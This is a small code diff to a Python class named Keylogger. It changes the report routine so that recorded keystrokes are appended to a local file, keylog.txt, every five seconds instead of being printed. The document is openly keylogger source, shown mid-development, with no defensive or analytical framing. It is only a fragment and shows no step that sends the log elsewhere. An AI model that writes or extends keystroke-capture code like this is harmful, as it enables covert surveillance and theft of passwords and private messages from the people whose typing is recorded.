@@ -18,7 +18,8 @@ class Keylogger:
                 current_key = " " + str(key) + " "
         self.append_to_log(current_key)
     def report(self):
-        print(self.log)
+        with open("keylog.txt", "a") as f:
+            f.write(self.log)
         self.log = ""
         timer = threading.Timer(5, self.report)
         timer.start()
